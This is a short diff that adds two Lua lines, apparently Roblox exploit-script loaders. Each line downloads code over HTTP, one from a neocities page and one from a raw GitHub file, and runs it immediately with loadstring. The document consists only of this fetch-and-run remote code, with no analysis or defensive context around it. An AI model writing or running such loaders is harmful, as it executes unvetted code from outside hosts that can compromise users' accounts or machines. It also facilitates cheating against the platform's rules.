@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://ghost352.neocities.org/RobloxScripts/"))()
+
+loadstring(HttpGet("https://raw.githubusercontent.com/Khanghfrg/Khanghfrg/refs/heads/main/Script2"))()
